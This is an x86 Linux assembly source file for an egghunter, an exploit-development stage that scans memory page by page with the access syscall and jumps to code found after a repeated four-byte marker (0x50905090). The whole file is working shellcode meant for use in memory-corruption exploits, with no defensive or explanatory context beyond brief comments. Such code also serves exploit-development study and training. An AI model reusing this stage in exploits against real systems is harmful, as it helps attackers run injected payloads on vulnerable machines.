; egghunter.nasm

global _start

section .text
_start: 
	xor edx, edx ; zer edx
inc_page:
	or dx, 0xfff ; 4095
inc_mem:
	inc edx ;+1 is 4096 equivilant to PAGE_SIZE
	lea ebx, [edx + 0x4] ;put address edx+4 into ebx
	push byte 0x21
	pop eax ;puts 0x21 int eax for syscall access
	int 0x80

	cmp al, 0xf2 ;f2 is returned on EFAULT (invalid)
	jz inc_page ;zero flag is set on EFAULT

	mov eax,0x50905090 ; memory address is valid if we reach here
	mov edi, edx
	scasd
	jnz inc_mem
	scasd
	jnz inc_mem
	jmp edi
